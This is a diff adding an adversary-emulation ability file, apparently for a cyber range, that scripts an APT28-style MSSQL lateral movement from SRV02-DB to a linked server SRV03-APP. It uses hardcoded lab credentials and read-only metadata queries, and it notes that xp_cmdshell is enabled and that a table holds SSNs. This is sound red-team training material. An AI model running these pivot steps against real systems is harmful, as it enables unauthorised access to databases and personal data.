@@ -1,0 +1,82 @@
+- name: 'APT28 - IRON MERIDIAN: MSSQL Login and Linked Server Lateral Movement (SRV02-DB to SRV03-APP)'
+  description: >-
+    Uses previously obtained database access to validate interactive connectivity to
+    the CorpApp SQL environment on SRV02-DB and assess whether trust relationships
+    extend beyond the primary instance. This step reflects an operator verifying
+    linked-server reachability, execution context, and application database
+    visibility before attempting deeper movement into adjacent backend systems.
+    Defensive indicators would include successful SQL authentication, metadata
+    queries against server and database objects, and follow-on activity involving
+    linked-server resolution or remote execution paths.
+  tactic: lateral-movement
+  technique_id: T1210
+  technique_name: 'Exploitation of Remote Services'
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  executors:
+  - name: psh
+    platform: windows
+    command: |-
+      $ErrorActionPreference = "Stop"
+
+      if (-not (Get-Command Invoke-Sqlcmd -ErrorAction SilentlyContinue)) {
+        Import-Module SQLPS -DisableNameChecking -ErrorAction SilentlyContinue
+        Import-Module SqlServer -ErrorAction SilentlyContinue
+      }
+
+      $instance = "SRV02-DB\SQLEXPRESS"
+      $user = "svc_db"
+      $pass = "Db@ccess2025!"
+
+      $queryLocal = @"
+      SELECT @@SERVERNAME AS LocalServer, SYSTEM_USER AS LoginContext, DB_NAME() AS CurrentDatabase;
+      SELECT name, is_linked, is_rpc_out_enabled FROM sys.servers ORDER BY server_id;
+      SELECT TOP 5 name FROM CorpApp.sys.tables ORDER BY name;
+      "@
+
+      $queryRemote = @"
+      EXEC ('SELECT @@SERVERNAME AS RemoteServer, SYSTEM_USER AS RemoteLogin, DB_NAME() AS CurrentDatabase') AT [SRV03-APP];
+      "@
+
+      Write-Host "[*] Querying local instance and linked-server metadata" -ForegroundColor Cyan
+      Invoke-Sqlcmd -ServerInstance $instance -Username $user -Password $pass -Query $queryLocal |
+        Format-Table -AutoSize | Out-String | Write-Host
+
+      Write-Host "`n[*] Verifying linked-server execution context (read-only)" -ForegroundColor Cyan
+      Invoke-Sqlcmd -ServerInstance $instance -Username $user -Password $pass -Query $queryRemote |
+        Format-Table -AutoSize | Out-String | Write-Host
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 120
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info:
+      source_host: SRV02-DB.cyberange.local
+      source_ip_suffix: .30
+      target_host: SRV03-APP.cyberange.local
+      target_ip_suffix: .40
+      domain: cyberange.local
+      sql_instance: 'SRV02-DB\SQLEXPRESS'
+      pivot_account:
+        username: svc_db
+        password: 'Db@ccess2025!'
+        role: sysadmin
+      linked_server_name: SRV03-APP
+      linked_server_security_context:
+        username: svc_app
+        password: 'AppSvc!2025'
+      xp_cmdshell_enabled: true
+      rpc_out_enabled: true
+      target_database: CorpApp
+      notable_tables:
+        - Employees (contains SSNs and salary data)
+        - Sessions
+        - ErrorLog
+      execution_context_after_hop: 'CYBERANGE\svc_app (sysadmin on SRV03-APP)'
+  requirements: []
+  id: b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7
